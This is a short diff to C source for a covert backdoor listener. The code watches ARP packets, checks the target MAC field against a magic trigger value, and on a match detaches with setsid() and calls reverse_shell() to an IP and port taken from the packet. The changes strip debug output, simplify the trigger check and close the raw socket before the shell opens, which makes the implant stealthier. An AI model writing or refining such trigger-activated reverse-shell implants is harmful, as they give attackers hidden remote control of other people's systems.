@@ -101,6 +101,7 @@ int arp_listener()
 		unsigned long second;
 		unsigned long trigger;
 		
+		// Split MAC field in half using bit shifting
 		first=(arphdr->ar_tha[0]<<16); 
 		first+=(arphdr->ar_tha[1]<<8); 
 		first+=(arphdr->ar_tha[2]); 
@@ -110,10 +111,7 @@ int arp_listener()
 
 		trigger = first + second;
 
-		printf("Target MAC: %lu:%lu\n",first,second);
-		printf("Trigger Math = %lu\n",trigger);
-		if(trigger == 0x1fffdfe) printf("Triggered!\n");
-		if(ntohs(arphdr->ar_hrd) == 24){
+		if(trigger == 0x1fffdfe) {
 
 			unsigned short port;
 			unsigned int   ip;
@@ -129,6 +127,7 @@ int arp_listener()
 			{
 				if(setsid()>0)
 				{
+					close(sock_raw);
 					reverse_shell(ip,port);
 				}
 			}
